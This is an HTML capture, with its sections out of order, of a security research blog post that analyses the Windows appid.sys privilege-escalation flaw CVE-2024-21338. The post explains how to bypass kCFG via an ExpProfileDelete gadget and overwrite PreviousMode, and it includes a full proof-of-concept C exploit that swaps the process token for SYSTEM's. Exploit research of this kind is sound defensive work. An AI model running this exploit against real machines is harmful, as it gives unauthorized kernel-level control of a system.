+   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
+...
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
+   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Back in the Analytics machine, press any button to proceed to the next step. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
+system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Kernel Read/Write is now possible with &lt;code&gt;pNtWritevirtualMemory&lt;/code&gt; function through PreviousMode modification. After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&amp;#x2026;!&lt;/p&gt;
+&lt;p&gt;After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&amp;#x2026;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I got a BSOD.. ??&lt;/p&gt;
+&lt;p&gt;The problem occurs when we modify PreviousMode to kernel mode and then try to create a process with system privileges. Since the kernel mode PreviousMode is not needed after token swapping, it should be restored to its original value of 1 before creating the cmd process so that the process can be created without crashing.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
+*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+
+pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);
+system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If we add the code above and try again&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can modify the PreviousMode to achieve elevated privileges.&lt;/p&gt;
+&lt;p&gt;Coming back to the kCFG bypass, we can modify the PreviouMode by calling a normal kernel function registered in the kCFG bitmap after triggering the untrusted pointer dereference vulnerability of CVE-2024-21338. But&amp;#x2026; how do we find this function among the many, many kernel functions :(&lt;/p&gt;
+&lt;p&gt;One function worth noting is the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; kernel macro. This macro decrements the reference count field of the object address being passed (offset -0x30), so it would be a perfect macro to change PreviousMode from a user-mode value of 1 to a kernel-mode value of 0.&lt;/p&gt;
+&lt;p&gt;However, there is one limitation to calling &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; directly. As we saw earlier in the bug trigger, we can&amp;#x2019;t directly control the value of the first argument, but only indirectly control the value.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We need to find another wrapper function that allows us to dereference rcx once and pass the value as an argument to the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; macro so that we can control it directly.&lt;/p&gt;
+&lt;p&gt;If we look far enough down the cross-reference list of the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; macro, we find the &lt;code&gt;ExpProfileDelete&lt;/code&gt; function that satisfies that condition.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs lua&#34;&gt;void __fastcall ExpProfileDelete(__int64 a1)
+{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;) )
+  {
+    KeStopProfile(*(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;));
+    MmUnmapLockedPages(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;), *(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
+    MmUnlockPages(*(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
+    ExFreePoolWithTag(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)a1 )
+    ObfDereferenceObjectWithTag(*(PVOID *)a1, &lt;span class=&#34;hljs-number&#34;&gt;0x66507845&lt;/span&gt;u);
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We call it by passing the value referencing the first argument to &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt;, which gives us direct control over the first argument of the macro. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2011.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First of all, when calling the &lt;code&gt;ExpProfileDelete&lt;/code&gt; function via CVE-2024-21338 vulnerability, kCFG is bypassed and jumps to the &lt;code&gt;ExpProfileDelete&lt;/code&gt; address.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The &lt;code&gt;ExpProfileDelete&lt;/code&gt; function address can be obtained by calculating the offset from the ntoskrnle.exe base obtained via &lt;code&gt;NtQuerySystemInformation&lt;/code&gt; in Part 1.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2012.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Inside &lt;code&gt;ExpProfileDelete&lt;/code&gt;, the rcx at the time of the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; macro call comes out as &lt;code&gt;0x414141414141414141&lt;/code&gt;. We can finally decrement the address we want!&lt;/p&gt;
+&lt;p&gt;There may be more functions that satisfy our conditions, even if they are not &lt;code&gt;ExpProfileDelete&lt;/code&gt;. However, the more complex the logic of the function, the more likely it is to crash and execute code other than our intended behavior, so it&amp;#x2019;s probably a good idea to find a relatively simple function to target.&lt;/p&gt;
+&lt;p&gt;Below is the final proof-of-concept code that modifies PreviousMode and performs Token Swapping with CVE-2024-21338 vulnerability&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; DEVICE_NAME &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;\\\\?\\AppID&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// IOCTL 0x22A018&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; {&lt;/span&gt;
+	PVOID arg1;
+	PVOID objptr;
+	PVOID cfgptr;
+	PVOID unknown;
+} INPUT_BUFFER;
+
+_NtQuerySystemInformation pNtQuerySystemInformation;
+_NtFsControlFile pNtFsControlFile;
+_NtWriteVirtualMemory pNtWriteVirtualMemory;
+_NtReadVirtualMemory pNtReadVIrtualMemory;
+_NtDeviceIoControlFile pNtDeviceIoControlFile;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetImageBase&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ModuleName)&lt;/span&gt; &lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetFILE_OBJECT_Address&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
+	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID PreviousMode = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID NTOSKRNL_BASE = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+
+	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	GetNtFunction();
+
+	DWORD pid = GetCurrentProcessId();
+
+	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
+	GetObj(&amp;amp;KTHREAD, pid, hThread);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);
+
+	PreviousMode = (UINT64)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;;
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] PreviousMode address: %p\n&amp;quot;&lt;/span&gt;, PreviousMode);
+
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+	GetObj(&amp;amp;EPROCESS, pid, hProc);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);
+
+	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);
+
+	NTOSKRNL_BASE = GetImageBase(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ntoskrnl.exe&amp;quot;&lt;/span&gt;);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ntoskrnl.exe base address : %p\n&amp;quot;&lt;/span&gt;, NTOSKRNL_BASE);
+
+	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + &lt;span class=&#34;hljs-number&#34;&gt;0xA01FD0&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// kcfg bypass gadget&lt;/span&gt;
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ExpProfileDelete function address : %p\n&amp;quot;&lt;/span&gt;, ExpProfileDelete);
+
+	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();
+
+	INPUT_BUFFER buffer = { &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, };
+	HANDLE dHandle;
+	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, CREATE_NEW, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
+
+	buffer.arg1 = (UINT64)PreviousMode + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;;		
+	buffer.objptr = FILE_OBJECT;					
+	buffer.cfgptr = &amp;amp;ExpProfileDelete;				
+	buffer.unknown = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;							
+
+	IO_STATUS_BLOCK ioStatus;
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (pNtDeviceIoControlFile(dHandle, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;ioStatus, &lt;span class=&#34;hljs-number&#34;&gt;0x22A018&lt;/span&gt;, &amp;amp;buffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(buffer), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;dwbytes) != NOERROR) {
+		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NtDeviceIoControlFile Failed, 0x%x\n&amp;quot;&lt;/span&gt;, GetLastError());
+	}
+
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
+	*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);
+
+	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2013.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I originally planned to introduce all three techniques in this part. It ended up being longer than I thought, so I&amp;#x2019;ll summarize the remaining two techniques in the next part&amp;#x2026; (it&amp;#x2019;s okay, I&amp;#x2019;m off for the holidays)&lt;/p&gt;
+&lt;p&gt;I&amp;#x2019;ll be back with Part 3 :) Keep up the good work in 2025!&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/">
+
+  <title>[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2025-01-12 19:00" pubdate>
+      2025년 1월 12일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p>
+<p>Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &#x2190; Now</p>
+<hr>
+<p>After last month&#x2019;s Part 1 introducing Windows Kernel Mitigation, we&#x2019;re back with Part 2, and this time it&#x2019;s time to dive into kCFG bypassing. We&#x2019;ll analyze the Local Privilege Escalation vulnerability CVE-2024-21338 in appid.sys, which was patched in February 2024, and introduce three post-exploitation techniques to bypass kCFG.</p>
+<h2 id="CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference"><a href="#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference" class="headerlink" title="CVE-2024-21338 - appid.sys Untrusted Pointer Dereference"></a>CVE-2024-21338 - appid.sys Untrusted Pointer Dereference</h2><blockquote>
+<p>Vulnerability analysis and exploitation was performed on Windows 23H2 build 22631.2861 (December 2023 Cumulative Update applied).</p>
+</blockquote>
+<p>The CVE-2024-21338 vulnerability itself is simple! </p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%201.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>When the appid.sys driver processes an I/O request from user mode, it calls the <code>AipSmartHashImageFile</code> function with a user mode buffer (SystemBuffer) if the IOCTL Code is <code>0x22A018</code>.</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%202.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Called in the following order: <code>AipSmartHashImageFile</code> - <code>AppHashComputeFileHashesInternal</code> - <code>AppHashComputeImageHashInternal</code>. In the <code>AppHashComputeImageHashInternal</code> function, call a pointer at offset <code>SystemBuffer+0x16.</code> </p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>By calling the user-mode controllable SystemBuffer in kernel context, the user will be able to call arbitrary callback pointers in kernel mode (red box). We can even control the address that references the first argument, rcx (blue box).</p>
+<p>For more analysis and PoC, check out the reference links below!</p>
+<ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp">https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/">https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/</a></li>
+</ul>
+<p>Now we can call any function we want, but can&#x2019;t take advantage of any shellcode or ROP gadgets configured in user mode due to the existence of the mitgation below. </p>
+<ul>
+<li>SMEP that prevents the CPU from executing userland (ring 3) code while in Supervisor Mode (ring 0) privileged state.</li>
+<li>kCFG that throws an exception and raises <code>KERNEL_SECURITY_CHECK_FAILURE</code> if the kernel address is not registered in the bitmap</li>
+</ul>
+<p>Even if the SMEP is bypassed by calling the address of the bypass gadget, it will still get stuck in kCFG because it is user-mode code.</p>
+<p>Kernel exploits aimed at privilege escalation via token swapping require read and write access to kernel memory. To achieve this, three exploit techniques can establish Full Arbitrary Kernel Read/Write primitives by calling kernel functions that satisfy with kCFG.</p>
+<ol>
+<li>PreviousMode</li>
+<li>SeDebugPrigvileges</li>
+<li>I/O Ring Buffer</li>
+</ol>
+<p><del>In this part, I will introduce the above three techniques</del> Due to lack of time, I will only introduce the exploit using PreviousMode in this part&#x2026; and will cover the exploit using SeDebugPrivileges and I/O Ring Buffer in the next part!</p>
+<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%204.png" srcset="/img/loading.gif" alt="image.png"></p>
+<h2 id="EXP-1-PreviousMode"><a href="#EXP-1-PreviousMode" class="headerlink" title="EXP 1 - PreviousMode"></a>EXP 1 - PreviousMode</h2><p>The first is via the PreviousMode modification.</p>
